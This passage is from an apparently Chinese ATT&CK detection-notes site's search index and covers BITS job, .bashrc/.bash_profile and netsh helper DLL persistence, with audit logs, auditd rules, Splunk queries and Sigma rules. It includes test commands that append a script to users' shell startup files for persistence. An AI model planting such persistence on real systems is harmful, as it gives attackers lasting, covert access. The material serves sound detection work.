bits\uff09\u6765\u68c0\u67e5\u5176\u72b6\u6001\u3002\u53ef\u4f7f\u7528BITSAdmin\u5de5\u5177\uff08bitsadmin/list/allusers/verbose\uff09\u679a\u4e3e\u6d3b\u8dc3\u7684BITS\u4efb\u52a1\u3002 \u76d1\u63a7BITSAdmin\u5de5\u5177\uff08\u5c24\u5176\u662fTransfer\uff0cCreate\uff0cAddFile\uff0cSetNotifyFlags\uff0cSetNotifyCmdLine\uff0cSetMinRetryDelay\uff0cSetCustomHeaders\u548cResume\u547d\u4ee4\u9009\u9879\uff09\u7684\u4f7f\u7528\u53caWindows\u4e8b\u4ef6\u65e5\u5fd7\u6765\u67e5\u770bBITS\u6d3b\u52a8\u3002\u8fd8\u8981\u8003\u8651\u901a\u8fc7\u89e3\u6790BITS\u4efb\u52a1\u6570\u636e\u5e93\u6765\u8c03\u67e5\u4efb\u52a1\u76f8\u5173\u7684\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\u3002 \u76d1\u63a7\u548c\u5206\u6790BITS\u751f\u6210\u7684\u7f51\u7edc\u6d3b\u52a8\u3002BITS\u4efb\u52a1\u4f7f\u7528HTTP\uff08S\uff09\u548cSMB\u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\uff0c\u4ec5\u9650\u4e8e\u521b\u5efa\u7528\u6237\uff0c\u5e76\u4e14\u4ec5\u5728\u8be5\u7528\u6237\u767b\u5f55\u65f6\u624d\u8d77\u4f5c\u7528\uff08\u5373\u4f7f\u7528\u6237\u5c06\u4efb\u52a1\u9644\u52a0\u5230\u670d\u52a1\u8d26\u53f7\uff0c\u6b64\u89c4\u5219\u4e5f\u9002\u7528\uff09\u3002","title":"\u5efa\u8bae"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_7","text":"Window\u6743\u9650\u7ef4\u6301\uff08\u516d\uff09 BITS Jobs https://www.cnblogs.com/xiaozi/p/11833583.html MITRE-ATT&CK-T1197 https://attack.mitre.org/techniques/T1197/ MITRE ATT&CK \u653b\u51fb\u77e5\u8bc6\u5e93\uff08\u4f01\u4e1a\uff09\u4e2d\u6587\u7248 https://hansight.github.io/#/detail BITS\u6301\u4e45\u5316\u7559\u75d5\u65e5\u5fd7\u6587\u4ef6\u4e0b\u8f7d\u5730\u5740 https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Persistence/persist_bitsadmin_Microsoft-Windows-Bits-Client-Operational.evtx","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/","text":"T1546-004-linux-.bash_profile\u548c.bashrc \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 ~/.bash_profile \u548c.bashrc\u662f\u5728\u65b0shell\u6253\u5f00\u65f6\u6216\u7528\u6237\u767b\u5f55\u65f6\u5728\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\uff0c\u4ee5\u4fbf\u6b63\u786e\u8bbe\u7f6e\u5176\u73af\u5883\u3002\u4e3a\u767b\u5f55shell\u6267\u884c\uff0c\u5e76\u4e3a\u4ea4\u4e92\u5f0f\u975e\u767b\u5f55shell\u6267\u884c\u3002\u8fd9\u610f\u5473\u7740\u5f53\u7528\u6237\uff08\u901a\u8fc7\u7528\u6237\u540d\u548c\u5bc6\u7801\uff09\u767b\u5f55\u5230\u63a7\u5236\u53f0\uff08\u672c\u5730\u6216\u901a\u8fc7SSH\u7b49\u8fdc\u7a0b\u767b\u5f55\uff09\u65f6\uff0c\u4f1a\u5728\u5c06\u521d\u59cb\u547d\u4ee4\u63d0\u793a\u7b26\u8fd4\u56de\u7ed9\u7528\u6237\u4e4b\u524d\u6267\u884c\u3002\u6bcf\u6b21\u6253\u5f00\u65b0\u7684shell\u65f6\u90fd\u4f1a\u6267\u884c\u3002\u8fd9\u5141\u8bb8\u7528\u6237\u5728\u9700\u8981\u6267\u884c\u67d0\u4e9b\u547d\u4ee4\u65f6\u8fdb\u884c\u66f4\u7ec6\u7c92\u5ea6\u7684\u63a7\u5236\u3002 \u8fd9\u4e9b\u6587\u4ef6\u662f\u7531\u672c\u5730\u7528\u6237\u7f16\u5199\u7684\uff0c\u7528\u4e8e\u914d\u7f6e\u81ea\u5df1\u7684\u73af\u5883; \u4f46\u662f\uff0c\u6bcf\u6b21\u7528\u6237\u767b\u5f55\u6216\u6253\u5f00\u65b0\u7684shell\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u63d2\u5165\u4ee3\u7801\u4ee5\u83b7\u5f97\u6301\u4e45\u6027\u3002 \u6d4b\u8bd5\u6848\u4f8b echo\u201c\uff03{command_to_add}\u201d>>\u301c/ .bashrc echo\u201c\uff03{command_to_add}\u201d>>\u301c/ .bash_profile \u68c0\u6d4b\u65e5\u5fd7 linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 linux_audit\u65e5\u5fd7 type=SYSCALL msg=audit(1565526007.269:5543): arch=c000003e syscall=59 success=yes exit=0 a0=5637bba2a518 a1=5637bba32968 a2=5637bba30130 a3=fffffffffffff000 items=2 ppid=7724 pid=7725 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm=\"echo\" exe=\"/usr/bin/echo\" key=\"auditcmd\" type=EXECVE msg=audit(1565526007.269:5543): argc=2 a0=\"echo\" a1=\"/home/icbc/1.sh\" type=CWD msg=audit(1565526007.269:5543): cwd=\"/home/icbc\" ...... type=SYSCALL msg=audit(1565526021.625:5547): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=5610372c7240 a2=441 a3=1b6 items=2 ppid=4356 pid=7726 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm=\"bash\" exe=\"/usr/bin/bash\" key=\"bashrc_changes\" bash\u5386\u53f2\u8bb0\u5f55 icbc@icbc:~$ history 100 sudo echo \"/home/icbc/1.sh\">> ~/.bashrc 101 sudo echo \"/home/icbc/1.sh\">> ~/.bash_profile \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u57fa\u4e8eaudit\u68c0\u6d4b index = linux sourcetype = linux_audit bashrc_changes \u503c\u5f97\u6ce8\u610f\u7684\u662f\u4f60\u8981\u624b\u52a8\u914d\u7f6e\u81ea\u5df1\u7684\u68c0\u6d4b\u89c4\u5219\uff0c\u5982\u4e0b\uff1a -w /home/user/.bashrc -p wa -k bashrc_changes -w /home/user/.bash_profile -p wa -k bashrc_changes \u6ce8\u610f\uff1a\u6211\u4eec\u9700\u8981\u4e3a\u6bcf\u4e2a\u7528\u6237\u7684bashrc\u548cbash_profile\u6587\u4ef6\u6dfb\u52a0\u5ba1\u6838\u89c4\u5219\u3002\u5728audit\u89c4\u5219\u4e2d\u4e0d\u63a5\u53d7\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u521b\u5efa\u8fd9\u6837\u7684\u76d1\u89c6\u89c4\u5219\uff1a/home/*/.bash_history \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 index=linux sourcetype=bash_history bash_command=\"nano .bashrc\" OR bash_command=\"vi .bashrc\" OR echo .bashrc | table host,user_name,bash_command index=linux sourcetype=bash_history bash_command=\"nano .bashrc_profile\" OR bash_command=\"vi .bashrc_profile\" OR echo .bashrc_profile | table host,user_name,bash_command sigma\u68c0\u6d4b\u89c4\u5219 title: \u7f16\u8f91\u4fee\u6539.bash_profile\u548c.bashrc status: experimental description: \u68c0\u6d4b\u7528\u6237\u73af\u5883\u7684\u53d8\u5316\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u63d2\u5165\u4ee3\u7801\uff0c\u4ee5\u4fbf\u5728\u6bcf\u6b21\u7528\u6237\u767b\u5f55\u6216\u6253\u5f00\u65b0shell\u65f6\u83b7\u5f97\u6301\u4e45\u6027\u3002 references: - 'MITRE Attack technique T1156; .bash_profile and .bashrc. ' date: 2019/05/12 tags: - attack.s0003 - attack.t1156 - attack.persistence - attack.t1546.004 author: Peter Matkovski translator: 12306Bro logsource: product: linux service: auditd #auditd \u65e5\u5fd7 detection: selection: type: 'PATH' #\u8def\u5f84 name: - '/home/*/.bashrc' - '/home/*/.bash_profile' - '/home/*/.profile' - '/etc/profile' - '/etc/shells' - '/etc/bashrc' - '/etc/csh.cshrc' - '/etc/csh.login' condition: selection falsepositives: - Admin or User activity level: medium \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1546-004 https://attack.mitre.org/techniques/T1546/004/","title":"T1546-004-linux-.bash_profile\u548c.bashrc"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#t1546-004-linux-bash_profilebashrc","text":"","title":"T1546-004-linux-.bash_profile\u548c.bashrc"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#attck","text":"~/.bash_profile \u548c.bashrc\u662f\u5728\u65b0shell\u6253\u5f00\u65f6\u6216\u7528\u6237\u767b\u5f55\u65f6\u5728\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\uff0c\u4ee5\u4fbf\u6b63\u786e\u8bbe\u7f6e\u5176\u73af\u5883\u3002\u4e3a\u767b\u5f55shell\u6267\u884c\uff0c\u5e76\u4e3a\u4ea4\u4e92\u5f0f\u975e\u767b\u5f55shell\u6267\u884c\u3002\u8fd9\u610f\u5473\u7740\u5f53\u7528\u6237\uff08\u901a\u8fc7\u7528\u6237\u540d\u548c\u5bc6\u7801\uff09\u767b\u5f55\u5230\u63a7\u5236\u53f0\uff08\u672c\u5730\u6216\u901a\u8fc7SSH\u7b49\u8fdc\u7a0b\u767b\u5f55\uff09\u65f6\uff0c\u4f1a\u5728\u5c06\u521d\u59cb\u547d\u4ee4\u63d0\u793a\u7b26\u8fd4\u56de\u7ed9\u7528\u6237\u4e4b\u524d\u6267\u884c\u3002\u6bcf\u6b21\u6253\u5f00\u65b0\u7684shell\u65f6\u90fd\u4f1a\u6267\u884c\u3002\u8fd9\u5141\u8bb8\u7528\u6237\u5728\u9700\u8981\u6267\u884c\u67d0\u4e9b\u547d\u4ee4\u65f6\u8fdb\u884c\u66f4\u7ec6\u7c92\u5ea6\u7684\u63a7\u5236\u3002 \u8fd9\u4e9b\u6587\u4ef6\u662f\u7531\u672c\u5730\u7528\u6237\u7f16\u5199\u7684\uff0c\u7528\u4e8e\u914d\u7f6e\u81ea\u5df1\u7684\u73af\u5883; \u4f46\u662f\uff0c\u6bcf\u6b21\u7528\u6237\u767b\u5f55\u6216\u6253\u5f00\u65b0\u7684shell\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u63d2\u5165\u4ee3\u7801\u4ee5\u83b7\u5f97\u6301\u4e45\u6027\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_1","text":"echo\u201c\uff03{command_to_add}\u201d>>\u301c/ .bashrc echo\u201c\uff03{command_to_add}\u201d>>\u301c/ .bash_profile","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_2","text":"linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_4","text":"linux_audit\u65e5\u5fd7 type=SYSCALL msg=audit(1565526007.269:5543): arch=c000003e syscall=59 success=yes exit=0 a0=5637bba2a518 a1=5637bba32968 a2=5637bba30130 a3=fffffffffffff000 items=2 ppid=7724 pid=7725 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm=\"echo\" exe=\"/usr/bin/echo\" key=\"auditcmd\" type=EXECVE msg=audit(1565526007.269:5543): argc=2 a0=\"echo\" a1=\"/home/icbc/1.sh\" type=CWD msg=audit(1565526007.269:5543): cwd=\"/home/icbc\" ...... type=SYSCALL msg=audit(1565526021.625:5547): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=5610372c7240 a2=441 a3=1b6 items=2 ppid=4356 pid=7726 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm=\"bash\" exe=\"/usr/bin/bash\" key=\"bashrc_changes\" bash\u5386\u53f2\u8bb0\u5f55 icbc@icbc:~$ history 100 sudo echo \"/home/icbc/1.sh\">> ~/.bashrc 101 sudo echo \"/home/icbc/1.sh\">> ~/.bash_profile","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#audit","text":"index = linux sourcetype = linux_audit bashrc_changes \u503c\u5f97\u6ce8\u610f\u7684\u662f\u4f60\u8981\u624b\u52a8\u914d\u7f6e\u81ea\u5df1\u7684\u68c0\u6d4b\u89c4\u5219\uff0c\u5982\u4e0b\uff1a -w /home/user/.bashrc -p wa -k bashrc_changes -w /home/user/.bash_profile -p wa -k bashrc_changes \u6ce8\u610f\uff1a\u6211\u4eec\u9700\u8981\u4e3a\u6bcf\u4e2a\u7528\u6237\u7684bashrc\u548cbash_profile\u6587\u4ef6\u6dfb\u52a0\u5ba1\u6838\u89c4\u5219\u3002\u5728audit\u89c4\u5219\u4e2d\u4e0d\u63a5\u53d7\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u521b\u5efa\u8fd9\u6837\u7684\u76d1\u89c6\u89c4\u5219\uff1a/home/*/.bash_history","title":"\u57fa\u4e8eaudit\u68c0\u6d4b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#bash","text":"index=linux sourcetype=bash_history bash_command=\"nano .bashrc\" OR bash_command=\"vi .bashrc\" OR echo .bashrc | table host,user_name,bash_command index=linux sourcetype=bash_history bash_command=\"nano .bashrc_profile\" OR bash_command=\"vi .bashrc_profile\" OR echo .bashrc_profile | table host,user_name,bash_command","title":"\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#sigma","text":"title: \u7f16\u8f91\u4fee\u6539.bash_profile\u548c.bashrc status: experimental description: \u68c0\u6d4b\u7528\u6237\u73af\u5883\u7684\u53d8\u5316\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u63d2\u5165\u4ee3\u7801\uff0c\u4ee5\u4fbf\u5728\u6bcf\u6b21\u7528\u6237\u767b\u5f55\u6216\u6253\u5f00\u65b0shell\u65f6\u83b7\u5f97\u6301\u4e45\u6027\u3002 references: - 'MITRE Attack technique T1156; .bash_profile and .bashrc. ' date: 2019/05/12 tags: - attack.s0003 - attack.t1156 - attack.persistence - attack.t1546.004 author: Peter Matkovski translator: 12306Bro logsource: product: linux service: auditd #auditd \u65e5\u5fd7 detection: selection: type: 'PATH' #\u8def\u5f84 name: - '/home/*/.bashrc' - '/home/*/.bash_profile' - '/home/*/.profile' - '/etc/profile' - '/etc/shells' - '/etc/bashrc' - '/etc/csh.cshrc' - '/etc/csh.login' condition: selection falsepositives: - Admin or User activity level: medium","title":"sigma\u68c0\u6d4b\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_6","text":"MITRE-ATT&CK-T1546-004 https://attack.mitre.org/techniques/T1546/004/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/","text":"T1546-007-win-\u901a\u8fc7netsh key\u6301\u4e45\u5316 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6267\u884cNetsh Helper DLL\u89e6\u53d1\u7684\u6076\u610f\u5185\u5bb9\u6765\u5efa\u7acb\u6301\u4e45\u6027\u3002Netsh.exe\u662f\u4e00\u4e2a\u7ba1\u7406\u5458\u53ef\u4ee5\u7528\u6765\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u5904\u914d\u7f6e\u5e76\u76d1\u89c6\u57fa\u4e8eWindows\u7684\u8ba1\u7b97\u673a\u7684\u5de5\u5177\u3002\u4f7f\u7528Netsh.exe\u5de5\u5177\uff0c\u53ef\u4ee5\u5c06\u8f93\u5165\u7684\u4e0a\u4e0b\u6587\u547d\u4ee4\u5b9a\u5411\u5230\u9002\u5f53\u7684\u5e2e\u52a9\u5668\uff0c\u7136\u540e\u5e2e\u52a9\u5668\u5c06\u6267\u884c\u547d\u4ee4\u3002\u5e2e\u52a9\u5668\u662f\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93(.dll)\u6587\u4ef6\uff0c\u5b83\u901a\u8fc7\u63d0\u4f9b\u914d\u7f6e\u3001\u76d1\u89c6\u548c\u652f\u6301\u4e00\u79cd\u6216\u591a\u79cd\u670d\u52a1\u3001\u5b9e\u7528\u5de5\u5177\u6216\u534f\u8bae\uff0c\u6765\u6269\u5c55Netsh.exe\u5de5\u5177\u7684\u529f\u80fd\u3002 \u5df2\u6ce8\u518c\u7684netsh.exe\u5e2e\u52a9\u7a0b\u5e8fDLL\u7684\u8def\u5f84\u5728Windows\u6ce8\u518c\u8868HKLM\\SOFTWARE\\Microsoft\\Netsh\u4e2d \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528netsh.exe\u5e2e\u52a9\u7a0b\u5e8fDLL\u4ee5\u6301\u4e45\u7684\u65b9\u5f0f\u89e6\u53d1\u4efb\u610f\u4ee3\u7801\u7684\u6267\u884c\u3002\u8be5\u6267\u884c\u5c06\u5728\u6267\u884cnetsh.exe\u7684\u4efb\u4f55\u65f6\u95f4\u6267\u884c\uff0c\u8be5\u64cd\u4f5c\u53ef\u80fd\u4f1a\u81ea\u52a8\u53d1\u751f\uff0c\u4f7f\u7528\u53e6\u4e00\u79cd\u6301\u4e45\u6027\u6280\u672f\uff0c\u6216\u8005\u5728\u6267\u884cnetsh.exe\u4f5c\u4e3a\u5176\u6b63\u5e38\u529f\u80fd\u7684\u4e00\u90e8\u5206\u7684\u7cfb\u7edf\u4e0a\u5b58\u5728\u5176\u4ed6\u8f6f\u4ef6\uff08\u4f8b\u5982VPN\uff09\u7684\u60c5\u51b5\u4e0b\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5efa\u8bae\u53c2\u8003Bypass\u5e08\u5085\u7684 Window\u6743\u9650\u7ef4\u6301\uff08\u5341\uff09\uff1aNetsh Helper DLL \u68c0\u6d4b\u65e5\u5fd7 windows sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u5efa\u8bae\u53c2\u8003Bypass\u5e08\u5085\u7684 Window\u6743\u9650\u7ef4\u6301\uff08\u5341\uff09\uff1aNetsh Helper DLL \u6d4b\u8bd5\u7559\u75d5 \u5f53\u6267\u884c\u201c \u6dfb\u52a0\u5e2e\u52a9\u7a0b\u5e8f \u201d\u547d\u4ee4\u4ee5\u52a0\u8f7dDLL\u6587\u4ef6\u65f6\uff0c\u5c06\u5728\u4ee5\u4e0b\u4f4d\u7f6e\u521b\u5efa\u6ce8\u518c\u8868\u9879\u3002 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NetSh \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u68c0\u6d4b\u89c4\u5219 title: \u901a\u8fc7netsh key\u6301\u4e45\u5316 status: experimental description: \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528netsh.exe\u5e2e\u52a9\u7a0b\u5e8fDLL\u4ee5\u6301\u4e45\u7684\u65b9\u5f0f\u89e6\u53d1\u4efb\u610f\u4ee3\u7801\u7684\u6267\u884c references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1546.007/T1546.007.md#atomic-test-1---netsh-helper-dll-registration - https://eqllib.readthedocs.io/en/latest/analytics/5f9a71f4-f5ef-4d35-aff8-f67d63d3c896.html date: 2020-11-29 tags: - attack.t1546-007 author: 12306Br0 logsource: product: windows service: sysmon detection: selection_registry: EventID: 13 #\u521b\u5efa\u6ce8\u518c\u8868\u503c sysmon\u65e5\u5fd7 Registry_path: \"*\\\\Software\\\\Microsoft\\\\NetSh\\\\*\" condition: selection level: medium \u5176\u4ed6\u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1546-007 https://attack.mitre.org/techniques/T1546/007/ Window\u6743\u9650\u7ef4\u6301\uff08\u5341\uff09\uff1aNetsh Helper DLL https://www.cnblogs.com/xiaozi/p/11834533.html","title":"T1546-007-win-\u901a\u8fc7netsh key\u6301\u4e45\u5316"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#t1546-007-win-netsh-key","text":"","title":"T1546-007-win-\u901a\u8fc7netsh key\u6301\u4e45\u5316"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6267\u884cNetsh Helper DLL\u89e6\u53d1\u7684\u6076\u610f\u5185\u5bb9\u6765\u5efa\u7acb\u6301\u4e45\u6027\u3002Netsh.exe\u662f\u4e00\u4e2a\u7ba1\u7406\u5458\u53ef\u4ee5\u7528\u6765\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u5904\u914d\u7f6e\u5e76\u76d1\u89c6\u57fa\u4e8eWindows\u7684\u8ba1\u7b97\u673a\u7684\u5de5\u5177\u3002\u4f7f\u7528Netsh.exe\u5de5\u5177\uff0c\u53ef\u4ee5\u5c06\u8f93\u5165\u7684\u4e0a\u4e0b\u6587\u547d\u4ee4\u5b9a\u5411\u5230\u9002\u5f53\u7684\u5e2e\u52a9\u5668\uff0c\u7136\u540e\u5e2e\u52a9\u5668\u5c06\u6267\u884c\u547d\u4ee4\u3002\u5e2e\u52a9\u5668\u662f\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93(.dll)\u6587\u4ef6\uff0c\u5b83\u901a\u8fc7\u63d0\u4f9b\u914d\u7f6e\u3001\u76d1\u89c6\u548c\u652f\u6301\u4e00\u79cd\u6216\u591a\u79cd\u670d\u52a1\u3001\u5b9e\u7528\u5de5\u5177\u6216\u534f\u8bae\uff0c\u6765\u6269\u5c55Netsh.exe\u5de5\u5177\u7684\u529f\u80fd\u3002 \u5df2\u6ce8\u518c\u7684netsh.exe\u5e2e\u52a9\u7a0b\u5e8fDLL\u7684\u8def\u5f84\u5728Windows\u6ce8\u518c\u8868HKLM\\SOFTWARE\\Microsoft\\Netsh\u4e2d \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528netsh.exe\u5e2e\u52a9\u7a0b\u5e8fDLL\u4ee5\u6301\u4e45\u7684\u65b9\u5f0f\u89e6\u53d1\u4efb\u610f\u4ee3\u7801\u7684\u6267\u884c\u3002\u8be5\u6267\u884c\u5c06\u5728\u6267\u884cnetsh.exe\u7684\u4efb\u4f55\u65f6\u95f4\u6267\u884c\uff0c\u8be5\u64cd\u4f5c\u53ef\u80fd\u4f1a\u81ea\u52a8\u53d1\u751f\uff0c\u4f7f\u7528\u53e6\u4e00\u79cd\u6301\u4e45\u6027\u6280\u672f\uff0c\u6216\u8005\u5728\u6267\u884cnetsh.exe\u4f5c\u4e3a\u5176\u6b63\u5e38\u529f\u80fd\u7684\u4e00\u90e8\u5206\u7684\u7cfb\u7edf\u4e0a\u5b58\u5728\u5176\u4ed6\u8f6f\u4ef6\uff08\u4f8b\u5982VPN\uff09\u7684\u60c5\u51b5\u4e0b\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_1","text":"\u5efa\u8bae\u53c2\u8003Bypass\u5e08\u5085\u7684 Window\u6743\u9650\u7ef4\u6301\uff08\u5341\uff09\uff1aNetsh Helper DLL","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_2","text":"windows sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_3","text":"\u5efa\u8bae\u53c2\u8003Bypass\u5e08\u5085\u7684 Window\u6743\u9650\u7ef4\u6301\uff08\u5341\uff09\uff1aNetsh Helper DLL","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_4","text":"\u5f53\u6267\u884c\u201c \u6dfb\u52a0\u5e2e\u52a9\u7a0b\u5e8f \u201d\u547d\u4ee4\u4ee5\u52a0\u8f7dDLL\u6587\u4ef6\u65f6\uff0c\u5c06\u5728\u4ee5\u4e0b\u4f4d\u7f6e\u521b\u5efa\u6ce8\u518c\u8868\u9879\u3002 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NetSh","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#sigma","text":"title: \u901a\u8fc7netsh key\u6301\u4e45\u5316 status: experimental description: \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528netsh.exe\u5e2e\u52a9\u7a0b\u5e8fDLL\u4ee5\u6301\u4e45\u7684\u65b9\u5f0f\u89e6\u53d1\u4efb\u610f\u4ee3\u7801\u7684\u6267\u884c references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1546.007/T1546.007.md#atomic-test-1---netsh-helper-dll-registration - https://eqllib.readthedocs.io/en/latest/analytics/5f9a71f4-f5ef-4d35-aff8-f67d63d3c896.html date: 2020-11-29 tags: - attack.t1546-007 author: 12306Br0 logsource: product: windows service: sysmon detection: selection_registry: EventID: 13 #\u521b\u5efa\u6ce8\u518c\u8868\u503c sysmon\u65e5\u5fd7 Registry_path: \"*\\\\Software\\\\Microsoft\\\\NetSh\\\\*\" condition: selection level: 